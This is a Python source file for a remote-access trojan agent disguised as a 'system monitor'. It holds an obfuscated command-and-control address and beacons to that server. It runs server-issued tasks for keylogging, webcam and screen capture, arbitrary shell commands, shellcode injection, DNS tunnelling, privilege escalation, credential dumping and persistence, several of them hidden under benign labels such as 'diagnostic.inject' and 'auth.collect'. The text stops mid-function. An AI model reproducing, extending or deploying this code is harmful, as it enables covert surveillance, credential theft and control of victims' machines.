import uuid
import time
import platform
import json
import base64
import logging
import requests
import threading
import importlib
from datetime import datetime
import traceback
import subprocess
import os
import hashlib
from cryptography.fernet import Fernet

# Import system monitoring and diagnostic modules
from modules.system_info import get_system_info
from modules.process import list_processes
from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger, is_keylogger_running, get_current_keylogger_text
from modules.shell import execute_command
from modules.files import list_directory, read_file
from modules.shellcode import inject_shellcode
from modules.dns_tunnel import start_dns_tunnel
from modules.privesc import attempt_privilege_escalation
from modules.credential_dump import dump_credentials
from modules.persistence import install_persistence

# Legacy scanner imports removed - functionality replaced by enhanced modules

# Import advanced vulnerability scanning modules
try:
    from modules.windows_vuln_scanner import scan_windows_vulnerabilities
except ImportError:
    logging.warning("Windows vulnerability scanner not available")
    scan_windows_vulnerabilities = None

try:
    from modules.linux_vuln_scanner import scan_linux_vulnerabilities
except ImportError:
    logging.warning("Linux vulnerability scanner not available")
    scan_linux_vulnerabilities = None

try:
    from modules.enhanced_network_scanner import scan_network_vulnerabilities
except ImportError:
    logging.warning("Enhanced network scanner not available")
    scan_network_vulnerabilities = None

try:
    from modules.vulnerability_database import get_vulnerability_database
except ImportError:
    logging.warning("Vulnerability database not available")
    get_vulnerability_database = None

try:
    from modules.exploitation_engine import test_vulnerabilities, ExploitationEngine
except ImportError:
    logging.warning("Exploitation engine not available")
    test_vulnerabilities = ExploitationEngine = None

# === Configuration ===
# Obfuscated configuration
_HOST_PARTS = ["http://", "192.168.200.105", ":5000"]
C2_URL = "".join(_HOST_PARTS)
BEACON_INTERVAL = 10
agent_id = f"{''.join(['m','o','n','i','t','o','r','_'])}{uuid.uuid4()}"  # Generate new ID each run
_KEY_B64 = ''.join(['dGhpcyBpcyBhIHNlY3JldCBrZXkgZm9yIGVuY3J5cHRpb24='])
ENCRYPTION_KEY = _KEY_B64.encode()
# ======================

# String obfuscation utilities
def _build_endpoint(*parts):
    """Build API endpoint from parts"""
    return ''.join(parts)

def _get_api_endpoints():
    """Get obfuscated API endpoints"""
    return {
        'register': _build_endpoint('/api/', 'agents/', 'register'),
        'beacon': _build_endpoint('/api/', 'agents/', 'beacon'),
        'tasks': _build_endpoint('/api/', 'tasks/'),
        'results': _build_endpoint('/api/', 'results')
    }

# Encryption utilities
def get_encryption_key():
    """Generate a consistent encryption key"""
    key_material = ENCRYPTION_KEY + agent_id.encode()
    key_hash = hashlib.sha256(key_material).digest()
    return base64.urlsafe_b64encode(key_hash[:32])

def encrypt_data(data):
    """Encrypt data using base64 encoding (temporarily simplified for compatibility)"""
    try:
        if isinstance(data, dict):
            data = json.dumps(data)
        elif isinstance(data, bytes):
            data = data.decode()
        return base64.b64encode(data.encode()).decode()
    except Exception as e:
        logging.error(f"Encoding error: {e}")
        return str(data)

def decrypt_data(encrypted_data):
    """Decrypt data using base64 decoding (temporarily simplified for compatibility)"""
    try:
        return base64.b64decode(encrypted_data).decode()
    except Exception as e:
        logging.error(f"Decoding error: {e}")
        return encrypted_data

# Logger setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def check_module_dependencies():
    """Check if all required modules are available and working"""
    module_status = {}
    try:
        # Test system_info module
        system_info = get_system_info()
        module_status['system_info'] = True
    except Exception as e:
        logging.error(f"System info module error: {str(e)}")
        module_status['system_info'] = False

    # Test other modules
    modules_to_test = {
        'process': list_processes,
        'surveillance': take_screenshot,
        'shell': execute_command,
        'files': list_directory
    }

    for module_name, test_func in modules_to_test.items():
        try:
            test_func()
            module_status[module_name] = True
        except Exception as e:
            logging.error(f"{module_name} module error: {str(e)}")
            module_status[module_name] = False

    # Test enhanced vulnerability scanning modules
    if scan_network_vulnerabilities:
        try:
            # Test enhanced network scanner with localhost
            test_result = scan_network_vulnerabilities('127.0.0.1', None)
            module_status['enhanced_network_scanner'] = True
        except Exception as e:
            logging.error(f"Enhanced network scanner module error: {str(e)}")
            module_status['enhanced_network_scanner'] = False
    else:
        module_status['enhanced_network_scanner'] = False

    # Test OS-specific vulnerability scanners
    if scan_windows_vulnerabilities:
        try:
            # Test Windows vulnerability scanner (minimal test)
            module_status['windows_vuln_scanner'] = True
        except Exception as e:
            logging.error(f"Windows vulnerability scanner error: {str(e)}")
            module_status['windows_vuln_scanner'] = False
    else:
        module_status['windows_vuln_scanner'] = False

    if scan_linux_vulnerabilities:
        try:
            # Test Linux vulnerability scanner (minimal test)
            module_status['linux_vuln_scanner'] = True
        except Exception as e:
            logging.error(f"Linux vulnerability scanner error: {str(e)}")
            module_status['linux_vuln_scanner'] = False
    else:
        module_status['linux_vuln_scanner'] = False

    return module_status

def register():
    system_info = get_system_info()
    module_status = check_module_dependencies()
    payload = {
        "agent_id": agent_id,
        "system_info": system_info,
        "module_status": module_status,
        "status": "active"
    }
    encoded = encrypt_data(payload)
    try:
        endpoints = _get_api_endpoints()
        r = requests.post(f"{C2_URL}{endpoints['register']}", json={"data": encoded}, timeout=10)
        if r.ok:
            logging.info("System monitoring registered successfully")
        else:
            logging.warning(f"Registration failed: {r.text}")
    except requests.exceptions.ConnectionError:
        logging.error(f"Could not connect to monitoring server at {C2_URL}. Please check if the server is running and accessible.")
    except Exception as e:
        logging.error(f"Registration error: {str(e)}")

def send_beacon():
    while True:
        # Get current system info for beacon
        try:
            system_info = get_system_info()
        except:
            system_info = {}
        
        # Collect additional metrics for dashboard
        logging.info("Starting metrics collection...")
        try:
            import psutil
            import os
            logging.info("psutil imported successfully")
            
            # System metrics
            cpu_percent = psutil.cpu_percent(interval=1)
            logging.info(f"CPU: {cpu_percent}")
            memory = psutil.virtual_memory()
            logging.info(f"Memory: {memory.percent}")
            
            # Get disk usage for current drive (Windows compatible)
            if os.name == 'nt':  # Windows
                disk = psutil.disk_usage('C:\\')
                logging.info("Using Windows disk path")
            else:  # Unix/Linux
                disk = psutil.disk_usage('/')
                logging.info("Using Unix disk path")
            
            logging.info(f"Disk: {disk.percent}")
            
            # Network stats
            network = psutil.net_io_counters()
            logging.info(f"Network sent: {network.bytes_sent}")
            
            # Process count
            process_count = len(psutil.pids())
            logging.info(f"Process count: {process_count}")
            
            metrics = {
                'cpu_usage': cpu_percent,
                'memory_usage': memory.percent,
                'memory_total': memory.total,
                'memory_used': memory.used,
                'disk_usage': disk.percent,
                'disk_total': disk.total,
                'disk_used': disk.used,
                'network_sent': network.bytes_sent,
                'network_recv': network.bytes_recv,
                'process_count': process_count,
                'uptime': time.time() - psutil.boot_time()
            }
            logging.info(f"Final metrics dict: {metrics}")
        except Exception as e:
            logging.error(f"Failed to collect metrics: {str(e)}")
            import traceback
            logging.error(f"Traceback: {traceback.format_exc()}")
            metrics = {}
            
        payload = {
            "agent_id": agent_id,
            "status": "online",
            "system_info": system_info,
            "metrics": metrics,
            "timestamp": datetime.now().isoformat()
        }
        encoded = encrypt_data(payload)
        try:
            endpoints = _get_api_endpoints()
            r = requests.post(f"{C2_URL}{endpoints['beacon']}", json={"data": encoded})
            if r.status_code != 200:
                logging.error("Monitoring beacon failed: " + r.text)
        except Exception as e:
            logging.error("Monitoring beacon error: " + str(e))
        time.sleep(BEACON_INTERVAL)

def fetch_tasks():
    while True:
        try:
            endpoints = _get_api_endpoints()
            r = requests.get(f"{C2_URL}{endpoints['tasks']}{agent_id}")
            if r.ok:
                resp = r.json()
                if 'data' in resp:
                    # Decrypt task JSON
                    task_json = decrypt_data(resp['data'])
                    task = json.loads(task_json)
                    if task.get("status") == "pending":
                        run_task(task)
            else:
                logging.error("Error getting tasks: " + r.text)
        except Exception as e:
            logging.error("Task fetch error: " + str(e))
        time.sleep(BEACON_INTERVAL)

def send_result(task_id, result):
    payload = {
        "agent_id": agent_id,
        "task_id": task_id,
        "result": result,
        "timestamp": datetime.now().isoformat()
    }
    encoded = encrypt_data(payload)
    try:
        endpoints = _get_api_endpoints()
        r = requests.post(f"{C2_URL}{endpoints['results']}", json={"data": encoded})
        if not r.ok:
            logging.error("Task result send failed: " + r.text)
    except Exception as e:
        logging.error("Task result send error: " + str(e))

def send_agent_log(log_message):
    payload = {
        "task_id": "agent_log_" + datetime.now().strftime("%Y%m%d_%H%M%S"),
        "agent_id": agent_id,
        "data": {
            "status": "agent_log",
            "log": log_message,
            "timestamp": datetime.now().isoformat()
        }
    }
    try:
        endpoints = _get_api_endpoints()
        r = requests.post(f"{C2_URL}{endpoints['results']}", json=payload)
    except Exception as e:
        pass  # If this fails, just log locally

def send_vulnerability_data(vuln_data):
    """Send vulnerability data to the server for dashboard processing"""
    try:
        logging.info(f"Sending vulnerability data to server: {len(vuln_data.get('vulnerabilities', []))} vulnerabilities found")
        payload = {
            "agent_id": agent_id,
            "vulnerabilities": vuln_data.get('vulnerabilities', []),
            "scan_type": "privilege_escalation",
            "timestamp": datetime.now().isoformat(),
            "platform": vuln_data.get('platform'),
            "status": "active"
        }
        encoded = encrypt_data(payload)
        endpoints = _get_api_endpoints()
        r = requests.post(f"{C2_URL}{endpoints['register']}", json={"data": encoded}, timeout=10)
        if r.ok:
            logging.info("Vulnerability data sent to server successfully")
        else:
            logging.warning(f"Failed to send vulnerability data: {r.text}")
    except Exception as e:
        logging.error(f"Error sending vulnerability data: {str(e)}")

def run_task(task):
    """Execute a task and send back the result"""
    task_id = task.get('task_id')
    task_type = task.get('type')
    task_data = task.get('data', {})
    result = None

    try:
        logging.info(f"Executing task {task_id} of type {task_type}")
        # Map diagnostic task types to system functions
        task_handlers = {
            'system.get_info': get_system_info,
            'system_get_info': get_system_info,
            'process.list': list_processes,
            'process_list': list_processes,
            'monitor.screenshot': take_screenshot,
            'monitor_screenshot': take_screenshot,
            'surveillance.screenshot': take_screenshot,
            'surveillance_screenshot': take_screenshot,
            'monitor.webcam': capture_webcam,
            'monitor_webcam': capture_webcam,
            'surveillance.webcam': capture_webcam,
            'surveillance_webcam': capture_webcam,
            'monitor.keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
            'monitor_keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
            'surveillance.keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
            'surveillance_keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
            'surveillance.keylogger.text': lambda: get_current_keylogger_text() if is_keylogger_running() else {'status': 'error', 'message': 'Keylogger not running'},
            'surveillance_keylogger_text': lambda: get_current_keylogger_text() if is_keylogger_running() else {'status': 'error', 'message': 'Keylogger not running'},
            'terminal.execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
            'terminal_execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
            'files.browser': lambda: list_directory(task_data.get('path', '.')),
            'files_browser': lambda: list_directory(task_data.get('path', '.')),
            'diagnostic.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
            'diagnostic_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
            'network.tunnel': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
            'network_tunnel': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
            'security.check': attempt_privilege_escalation,
            'security_check': attempt_privilege_escalation,
            'auth.collect': lambda: dump_credentials(task_id),
            'auth_collect': lambda: dump_credentials(task_id),
            'service.install': lambda: install_persistence(task_data.get('method', 'registry')),
            'service_install': lambda: install_persistence(task_data.get('method', 'registry')),
            'files.download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
            'files_download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
            
            # New vulnerability scanning tasks
            # Legacy network/system scan tasks redirected to enhanced modules
            'network.scan': lambda: scan_network_vulnerabilities(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network_vulnerabilities else {'status': 'error', 'error': 'Enhanced network scanner not available'},
            'network_scan': lambda: scan_network_vulnerabilities(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network_vulnerabilities else {'status': 'error', 'error': 'Enhanced network scanner not available'},
            'network.port_scan': lambda: scan_network_vulnerabilities(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network_vulnerabilities else {'status': 'error', 'error': 'Enhanced network scanner not available'},
            'network_port_scan': lambda: scan_network_vulnerabilities(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network_vulnerabilities else {'status': 'error', 'error': 'Enhanced network scanner not available'},
            'network.vulnerability_scan': lambda: scan_network_vulnerabilities(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network_vulnerabilities else {'status': 'error', 'error': 'Enhanced network scanner not available'},
            'network_vulnerability_scan': lambda: scan_network_vulnerabilities(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network_vulnerabilities else {'status': 'error', 'error': 'Enhanced network scanner not available'},
            
            # Legacy system scan tasks redirected to OS-specific vulnerability scanners
            'system.scan': lambda: scan_windows_vulnerabilities() if platform.system() == 'Windows' and scan_windows_vulnerabilities else (scan_linux_vulnerabilities() if platform.system() == 'Linux' and scan_linux_vulnerabilities else {'status': 'error', 'error': 'OS-specific scanner not available'}),
            'system_scan': lambda: scan_windows_vulnerabilities() if platform.system() == 'Windows' and scan_windows_vulnerabilities else (scan_linux_vulnerabilities() if platform.system() == 'Linux' and scan_linux_vulnerabilities else {'status': 'error', 'error': 'OS-specific scanner not available'}),
            'system.os_vulnerabilities': lambda: scan_windows_vulnerabilities() if platform.system() == 'Windows' and scan_windows_vulnerabilities else (scan_linux_vulnerabilities() if platform.system() == 'Linux' and scan_linux_vulnerabilities else {'status': 'error', 'error': 'OS-specific scanner not available'}),
            'system_os_vulnerabilities': lambda: scan_windows_vulnerabilities() if platform.system() == 'Windows' and scan_windows_vulnerabilities else (scan_linux_vulnerabilities() if platform.system() == 'Linux' and scan_linux_vulnerabilities else {'status': 'error', 'error': 'OS-specific scanner not available'}),
            
            'vulnerability.comprehensive_scan': lambda: comprehensive_vulnerability_scan(task_data),
            'vulnerability_comprehensive_scan': lambda: comprehensive_vulnerability_scan(task_data),
            
            # Advanced vulnerability scanning tasks
            'vuln.windows_scan': lambda: scan_windows_vulnerabilities() if scan_windows_vulnerabilities else {'status': 'error', 'error': 'Windows scanner not available'},
            'vuln_windows_scan': lambda: scan_windows_vulnerabilities() if scan_windows_vulnerabilities else {'status': 'error', 'error': 'Windows scanner not available'},
            'vuln.linux_scan': lambda: scan_linux_vulnerabilities() if scan_linux_vulnerabilities else {'status': 'error', 'error': 'Linux scanner not available'},
            'vuln_linux_scan': lambda: scan_linux_vulnerabilities() if scan_linux_vulnerabilities else {'status': 'error', 'error': 'Linux scanner not available'},
            'vuln.network_scan': lambda: scan_network_vulnerabilities(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network_vulnerabilities else {'status': 'error', 'error': 'Network scanner not available'},
            'vuln_network_scan': lambda: scan_network_vulnerabilities(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network_vulnerabilities else {'status': 'error', 'error': 'Network scanner not available'},
            'vuln.exploit_test': lambda: test_vulnerabilities(task_data.get('cve_list'), task_data.get('target', 'localhost')) if test_vulnerabilities else {'status': 'error', 'error': 'Exploitation engine not available'},
            'vuln_exploit_test': lambda: test_vulnerabilities(task_data.get('cve_list'), task_data.get('target', 'localhost')) if test_vulnerabilities else {'status': 'error', 'error': 'Exploitation engine not available'},
            'vuln.database_report': lambda: generate_vulnerability_report(task_data),
            'vuln_database_report': lambda: generate_vulnerability_report(task_data),
            'vuln.acunetix_scan': lambda: run_comprehensive_acunetix_scan(task_data),
            'vuln_acunetix_scan': lambda: run_comprehensive_acunetix_scan(task_data),
        }
        # Execute the task
        if task_type in task_handlers:
            result = task_handlers[task_type]()
        else:
            result = f"Unknown task type: {task_type}"
        # Flatten file/image results for download
        file_types = [
            'files.download', 'files_download',
            'surveillance.screenshot', 'surveillance_screenshot',
            'surveillance.webcam', 'surveillance_webcam',
            'surveillance.keylogger', 'surveillance_keylogger',
            'surveillance.keylogger.text', 'surveillance_keylogger_text'
        ]
        if task_type in file_types and isinstance(result, dict) and 'data' in result:
            send_result(task_id, {
                'status': result.get('status', 'success'),
                'data': result['data'],
                'format': result.get('format'),
                'path': result.get('path'),
                'filename': os.path.basename(result.get('path', '')) if result.get('path') else None,
                'timestamp': result.get('timestamp', datetime.now().isoformat()),
                'type': task_type
            })
        else:
            send_result(task_id, {
                'status': 'success',
                'data': result,
                'timestamp': datetime.now().isoformat(),
                'type': task_type
            })
    except Exception as e:
        error_msg = f"Task execution failed: {str(e)}"
        tb = traceback.format_exc()
        logging.error(error_msg)
        send_result(task_id, {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat(),
            'type': task_type
        })
        send_agent_log(tb)

def comprehensive_vulnerability_scan(task_data):
    """Perform comprehensive vulnerability scanning"""
    try:
        logging.info("Starting comprehensive vulnerability scan")
        
        scan_results = {
            'scan_type': 'comprehensive_vulnerability_scan',
            'timestamp': datetime.now().isoformat(),
            'agent_id': agent_id,
            'results': {}
        }
        
        # OS-specific vulnerability scan
        current_platform = platform.system()
        if current_platform == 'Windows' and scan_windows_vulnerabilities:
            try:
                logging.info("Performing Windows vulnerability scan")
                system_results = scan_windows_vulnerabilities()
                scan_results['results']['system_scan'] = system_results
            except Exception as e:
                logging.error(f"Windows scan failed: {str(e)}")
                scan_results['results']['system_scan'] = {'status': 'error', 'error': str(e)}
        elif current_platform == 'Linux' and scan_linux_vulnerabilities:
            try:
                logging.info("Performing Linux vulnerability scan")
                system_results = scan_linux_vulnerabilities()
                scan_results['results']['system_scan'] = system_results
            except Exception as e:
                logging.error(f"Linux scan failed: {str(e)}")
                scan_results['results']['system_scan'] = {'status': 'error', 'error': str(e)}
        else:
            scan_results['results']['system_scan'] = {'status': 'error', 'error': 'OS-specific scanner not available'}
        
        # Enhanced network vulnerability scan
        if scan_network_vulnerabilities:
            try:
                logging.info("Performing enhanced network vulnerability scan")
                target = task_data.get('target', '127.0.0.1')
                ports = task_data.get('ports')
                network_results = scan_network_vulnerabilities(target, ports)
                scan_results['results']['network_scan'] = network_results
            except Exception as e:
                logging.error(f"Network scan failed: {str(e)}")
                scan_results['results']['network_scan'] = {'status': 'error', 'error': str(e)}
        else:
            scan_results['results']['network_scan'] = {'status': 'error', 'error': 'Enhanced network scanner not available'}
        
        # Privilege escalation check
        try:
            logging.info("Performing privilege escalation check")
            privesc_results = attempt_privilege_escalation()
            scan_results['results']['privilege_escalation'] = privesc_results
        except Exception as e:
            logging.error(f"Privilege escalation check failed: {str(e)}")
            scan_results['results']['privilege_escalation'] = {'status': 'error', 'error': str(e)}
        
        # System information
        try:
            logging.info("Gathering system information")
            system_info = get_system_info()
            scan_results['results']['system_info'] = system_info
        except Exception as e:
            logging.error(f"System info gathering failed: {str(e)}")
            scan_results['results']['system_info'] = {'status': 'error', 'error': str(e)}
        
        # Compile vulnerability summary
        vulnerabilities = []
        
        # Extract vulnerabilities from OS-specific scan
        if 'system_scan' in scan_results['results'] and scan_results['results']['system_scan'].get('status') == 'success':
            # Enhanced vulnerability scanners return vulnerabilities directly
            system_vulns = scan_results['results']['system_scan'].get('vulnerabilities', [])
            vulnerabilities.extend(system_vulns)
        
        # Extract vulnerabilities from enhanced network scan
        if 'network_scan' in scan_results['results'] and scan_results['results']['network_scan'].get('status') == 'success':
            # Enhanced network scanner returns vulnerabilities directly
            network_vulns = scan_results['results']['network_scan'].get('vulnerabilities', [])
            vulnerabilities.extend(network_vulns)
        
        # Extract vulnerabilities from privilege escalation
        if 'privilege_escalation' in scan_results['results'] and scan_results['results']['privilege_escalation'].get('status') == 'success':
            privesc_vulns = scan_results['results']['privilege_escalation'].get('vulnerabilities', [])
            vulnerabilities.extend(privesc_vulns)
        
        scan_results['vulnerabilities'] = vulnerabilities
        scan_results['total_vulnerabilities'] = len(vulnerabilities)
        
        # Calculate risk score
        risk_score = calculate_risk_score(vulnerabilities)
        scan_results['risk_score'] = risk_score
        
        logging.info(f"Comprehensive vulnerability scan completed. Found {len(vulnerabilities)} vulnerabilities. Risk score: {risk_score}")
        
        return scan_results
        
    except Exception as e:
        logging.error(f"Comprehensive vulnerability scan failed: {str(e)}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat(),
            'scan_type': 'comprehensive_vulnerability_scan'
        }

def calculate_risk_score(vulnerabilities):
    """Calculate risk score based on vulnerabilities"""
    if not vulnerabilities:
        return 0
    
    severity_scores = {
        'Critical': 10,
        'High': 7,
        'Medium': 4,
        'Low': 1,
        'Info': 0
    }
    
    total_score = 0
    for vuln in vulnerabilities:
        severity = vuln.get('severity', 'Low')
        total_score += severity_scores.get(severity, 1)
    
    # Normalize to 0-100 scale
    max_possible_score = len(vulnerabilities) * 10
    if max_possible_score > 0:
        risk_score = (total_score / max_possible_score) * 100
    else:
        risk_score = 0
    
    return round(risk_score, 2)

def generate_vulnerability_report(task_data):
    """Generate comprehensive vulnerability report using the database"""
    try:
        if not get_vulnerability_database:
            return {
                'status': 'error',
                'error': 'Vulnerability database not available'
            }
        
        vuln_db = get_vulnerability_database()
        target = task_data.get('target', 'localhost')
        days = task_data.get('days', 7)
        
        report = vuln_db.generate_vulnerability_report(target, days)
        
        if report:
            report['status'] = 'success'
            report['agent_id'] = agent_id
            return report
        else:
            return {
                'status': 'error',
                'error': 'Failed to generate vulnerability report'
            }
            
    except Exception as e:
        logging.error(f"Error generating vulnerability report: {e}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

def run_comprehensive_acunetix_scan(task_data):
    """Run comprehensive vulnerability scan similar to Acunetix capabilities"""
    try:
        logging.info("Starting comprehensive Acunetix-style vulnerability scan...")
        
        scan_id = f"acunetix_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        target = task_data.get('target', 'localhost')
        scan_type = task_data.get('scan_type', 'comprehensive')
        
        scan_results = {
            'scan_id': scan_id,
            'scan_type': 'acunetix_comprehensive',
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'agent_id': agent_id,
            'results': {}
        }
        
        current_platform = platform.system()
        
        # Phase 1: Operating System Vulnerability Scan
        logging.info("Phase 1: OS vulnerability scanning...")
        if current_platform == 'Windows' and scan_windows_vulnerabilities:
            try:
                windows_results = scan_windows_vulnerabilities()
                scan_results['results']['os_scan'] = windows_results
            except Exception as e:
                scan_results['results']['os_scan'] = {'status': 'error', 'error': str(e)}
        elif current_platform == 'Linux' and scan_linux_vulnerabilities:
            try:
                linux_results = scan_linux_vulnerabilities()
                scan_results['results']['os_scan'] = linux_results
            except Exception as e:
                scan_results['results']['os_scan'] = {'status': 'error', 'error': str(e)}
        else:
            scan_results['results']['os_scan'] = {'status': 'skipped', 'reason': 'OS scanner not available'}
        
        # Phase 2: Network Service Vulnerability Scan
        logging.info("Phase 2: Network service vulnerability scanning...")
        if scan_network_vulnerabilities:
            try:
                network_results = scan_network_vulnerabilities(target, task_data.get('ports'))
                scan_results['results']['network_scan'] = network_results
            except Exception as e:
                scan_results['results']['network_scan'] = {'status': 'error', 'error': str(e)}
        else:
            scan_results['results']['network_scan'] = {'status': 'skipped', 'reason': 'Network scanner not available'}
        
        # Phase 3: Privilege Escalation Assessment
        logging.info("Phase 3: Privilege escalation assessment...")
        try:
            privesc_results = attempt_privilege_escalation()
            scan_results['results']['privilege_escalation'] = privesc_results
        except Exception as e:
            scan_results['results']['privilege_escalation'] = {'status': 'error', 'error': str(e)}
        
        # Phase 4: Exploitation Testing (if requested)
        if task_data.get('include_exploits', False) and test_vulnerabilities:
            logging.info("Phase 4: Exploitation testing...")
            try:
                exploit_results = test_vulnerabilities(task_data.get('cve_list'), target)
                scan_results['results']['exploitation'] = exploit_results
            except Exception as e:
                scan_results['results']['exploitation'] = {'status': 'error', 'error': str(e)}
        
        # Phase 5: Compile comprehensive vulnerability list
        all_vulnerabilities = []
        
        # Extract vulnerabilities from OS scan
        if 'os_scan' in scan_results['results'] and scan_results['results']['os_scan'].get('status') == 'success':
            os_vulns = scan_results['results']['os_scan'].get('vulnerabilities', [])
            all_vulnerabilities.extend(os_vulns)
        
        # Extract vulnerabilities from network scan
        if 'network_scan' in scan_results['results'] and scan_results['results']['network_scan'].get('status') == 'success':
            network_vulns = scan_results['results']['network_scan'].get('vulnerabilities', [])
            all_vulnerabilities.extend(network_vulns)
        
        # Extract vulnerabilities from privilege escalation
        if 'privilege_escalation' in scan_results['results'] and scan_results['results']['privilege_escalation'].get('status') == 'success':
            privesc_vulns = scan_results['results']['privilege_escalation'].get('vulnerabilities', [])
            all_vulnerabilities.extend(privesc_vulns)
        
        # Calculate overall risk assessment
        risk_score = calculate_risk_score(all_vulnerabilities)
        severity_breakdown = get_severity_breakdown(all_vulnerabilities)
        
        scan_results.update({
            'vulnerabilities': all_vulnerabilities,
            'total_vulnerabilities': len(all_vulnerabilities),
            'risk_score': risk_score,
            'severity_breakdown': severity_breakdown,
            'scan_duration': (datetime.now() - datetime.fromisoformat(scan_results['timestamp'])).total_seconds(),
            'status': 'success'
        })
        
        # Store results in database if available
        if get_vulnerability_database:
            try:
                vuln_db = get_vulnerability_database()
                vuln_db.store_scan_results(scan_id, target, 'acunetix_comprehensive', scan_results)
            except Exception as e:
                logging.error(f"Failed to store scan results: {e}")
        
        logging.info(f"Comprehensive scan completed: {len(all_vulnerabilities)} vulnerabilities found")
        return scan_results
        
    except Exception as e:
        logging.error(f"Comprehensive vulnerability scan failed: {e}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat(),
            'scan_type': 'acunetix_comprehensive'
        }

def get_severity_breakdown(vulnerabilities):
    """Get breakdown of vulnerabilities by severity"""
    breakdown = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
    for vuln in vulnerabilities:
        severity = vuln.get('severity', 'Low')
        breakdown[severity] = breakdown.get(severity, 0) + 1
    return breakdown

def auto_task_post_startup():
    logging.info("Running startup modules...")
    results = {
        "system_info": get_system_info()
    }
    for key, value in results.items():
        task_id = f"{key}_{datetime.now().strftime('%H%M%S')}"
        send_result(task_id, value)

    # Schedule automatic vulnerability scanning
    threading.Thread(target=run_automatic_vulnerability_scan, daemon=True, name="AutoVulnScanner").start()

def run_automatic_vulnerability_scan():
    """Run comprehensive vulnerability scan automatically after startup"""
    try:
        # Wait a few seconds after startup for system to stabilize
        time.sleep(30)
        
        logging.info("Starting automatic comprehensive vulnerability scan...")
        
        # Prepare scan configuration
        scan_config = {
            'target': 'localhost',
            'include_exploits': True,
            'scan_type': 'comprehensive',
            'auto_scan': True
        }
        
        # Run comprehensive Acunetix-style scan
        scan_results = run_comprehensive_acunetix_scan(scan_config)
        
        # Send scan results to server
        task_id = f"auto_vuln_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        send_result(task_id, {
            'status': 'success',
            'scan_type': 'automatic_comprehensive_scan',
            'data': scan_results,
            'timestamp': datetime.now().isoformat(),
            'auto_initiated': True
        })
        
        # Run OS-specific scan
        current_platform = platform.system()
        if current_platform == 'Windows' and scan_windows_vulnerabilities:
            logging.info("Running automatic Windows vulnerability scan...")
            windows_results = scan_windows_vulnerabilities()
            
            task_id = f"auto_windows_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            send_result(task_id, {
                'status': 'success',
                'scan_type': 'automatic_windows_scan',
                'data': windows_results,
                'timestamp': datetime.now().isoformat(),
                'auto_initiated': True
            })
            
        elif current_platform == 'Linux' and scan_linux_vulnerabilities:
            logging.info("Running automatic Linux vulnerability scan...")
            linux_results = scan_linux_vulnerabilities()
            
            task_id = f"auto_linux_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            send_result(task_id, {
                'status': 'success',
                'scan_type': 'automatic_linux_scan', 
                'data': linux_results,
                'timestamp': datetime.now().isoformat(),
                'auto_initiated': True
            })
        
        # Run network scan
        if scan_network_vulnerabilities:
            logging.info("Running automatic network vulnerability scan...")
            network_results = scan_network_vulnerabilities('127.0.0.1', None)
            
            task_id = f"auto_network_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            send_result(task_id, {
                'status': 'success',
                'scan_type': 'automatic_network_scan',
                'data': network_results,
                'timestamp': datetime.now().isoformat(),
                'auto_initiated': True
            })
        
        logging.info("Automatic vulnerability scanning completed successfully")
        
    except Exception as e:
        logging.error(f"Automatic vulnerability scan failed: {e}")
        
        # Send error report
        task_id = f"auto_scan_error_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        send_result(task_id, {
            'status': 'error',
            'scan_type': 'automatic_scan_error',
            'error': str(e),
            'timestamp': datetime.now().isoformat(),
            'auto_initiated': True
        })

def run_security_assessment():
    result = attempt_privilege_escalation()
    if result.get('status') == 'success':
        logging.info('Security assessment completed successfully.')
        # Send vulnerability data to server
        if 'data' in result and 'vulnerabilities' in result['data']:
            send_vulnerability_data(result['data'])
    else:
        logging.warning('Security assessment completed with warnings.')
    
    # Always send vulnerability data to server, even if no vulnerabilities found
    if 'data' in result:
        send_vulnerability_data(result['data'])

def initialize_system_monitor():
    """Initialize system monitoring components"""
    try:
        # Perform legitimate system initialization tasks
        logging.info("Initializing system performance monitor...")
        
        # Check system health
        import psutil
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        logging.info(f"System Health Check - CPU: {cpu_percent}%, Memory: {memory.percent}%")
        
        # Check disk space
        import shutil
        total, used, free = shutil.disk_usage("C:" if os.name == 'nt' else '/')
